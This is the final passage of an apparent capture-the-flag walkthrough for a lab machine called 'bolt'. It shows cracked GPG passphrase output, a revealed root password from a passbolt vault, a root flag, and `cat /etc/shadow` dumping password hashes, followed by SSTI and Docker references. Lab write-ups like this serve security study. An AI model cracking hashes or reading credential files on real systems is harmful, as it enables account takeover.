Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])

[...snip...]

merrychristmas   (Eddie Johnson)
1g 0:00:06:38 DONE (2021-11-12 11:08) 0.002507g/s 107.4p/s 107.4c/s 107.4C/s mhines..menudo
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

With the cracked password we are now able to access the passbolt app and can view the password for the application **root user** (**`Z(2rmxsNW(Z?3=p/9s`**).

![[Pasted image 20211112111055.png]]

Escalate to root, and grab the flag.

```bash
Password: 
root@bolt:/home/eddie# cat /root/root.txt
182bf942f16b38f705a6375aafd98fa7
```
```bash
root@bolt:/home/eddie# cat /etc/shadow
root:$6$gID7DRyUwzMW69Ul$209oMxMiaHmg1iiIbvO0z7Z7Twe./PKnGZKede1XYfsqynZ/xLN5jAmtwMLFWpFLeV6vf8YSVsj87Q5zkbudX.:18879:0:99999:7:::
eddie:$6$hr9Mpb1gVh69X761$BBw9u5yqbhdMyhic/GDq.aRHBErqOw7d/uYrNOnzOtgBoiXz4HSdU1l2jzRxSa6PJMiNSQ6cGx1YtIUtqXboo/:18692:0:99999:7:::
clark:$6$W85bOWcfI3balSJ3$tT0hU4y9FeMhu9nlu8CRFt9RiQwO0VEWqA3oVNJWbR63/lO3YJIN1lKe5UdxrencyWBvbClv2LwqGtW6ZeDuk1:18683:0:99999:7:::
```


--------------------------------------------

# References
__docker:__
https://docs.docker.com/engine/reference/commandline/load/
https://www.educba.com/docker-import/

__ssti:__
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
https://0xdf.gitlab.io/2019/01/12/htb-oz.html
https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6

**passbolt recovery:**
https://community.passbolt.com/t/passbolt-self-hosted-does-not-send-password-recovery-email-only-from-administrator/3625